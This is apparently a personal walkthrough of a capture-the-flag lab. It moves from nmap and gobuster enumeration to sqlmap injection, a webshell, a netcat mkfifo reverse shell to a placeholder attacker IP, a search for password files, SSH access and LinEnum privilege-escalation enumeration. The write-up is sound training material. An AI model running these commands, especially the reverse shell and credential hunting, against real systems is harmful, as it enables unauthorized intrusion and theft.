### Perpare
```
export ip=TargetIP
```

### Task 2
1. `nmap -T4 -p- $ip`
2. `nmap -p 80 -A $ip`
3. `nmap -p 22 -A $ip`
4. `nmap -p 80 -A $ip`

I dunno why they ordering this. #2 and #4 are just same one line nmap

### Task 3
`gobuster dir -u $ip -w /usr/share/wordlists/dirb/big.txt -x php,txt`
`/.xxx (Status: 200)`

### Task 4
Bacially just sqlmap. You don't need any input just keep `Y` until you got the injectable target.

https://gist.github.com/A1vinSmith/3121e6854de93dfea6e8ab65718d07ed

`$URL` would be `export URL=http://TargetIP/.xxx` the path found in Task 3

1. Find it from the final database data
2. Find it from the final database data
3. `sqlmap resumed the following injection point(s) from stored session:` They're X injection from here

### Task 5
Login with the credential found from Task4

You're in a page with the webshell you can use now

1. Noted there is one duplicate item shows up. It doesn't count
```
ls
```

2. Check Pingu still there or not
```
cat /etc/passwd | grep /bin/bash
```

3. Netcat get reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HackerIP 4242 >/tmp/f
```

On you kali, listen the 4242 port
`nc -lvnp 4242`

okay, now Gain a stable shell instead of the reverse-shell https://github.com/A1vinSmith/OSCP-PWK/wiki/Python

now we're on this `www-data@ubuntu:/home/papa$`

Find the hidden pass
`find / -name *pass* -user www-data 2>/dev/null`

Get the ssh by `cat /var/hidden/pass`

### Task 6
1. Login with the ssh password
`ssh pingu@$ip`

Method 1: SCP
`scp LinEnum.sh pingu@$ip:/tmp`

Method 2: https://blog.netspi.com/15-ways-to-download-a-file/

Now go to `/tmp` find the `LinEnum.sh`, make it excutable if it need to be `chmod +x LinEnum.sh`
run plus save it `./LinEnum.sh | tee linout.txt`

It should shou up under `[-] SUID files`
not `usr/bin` or `/bin`. a special one here.















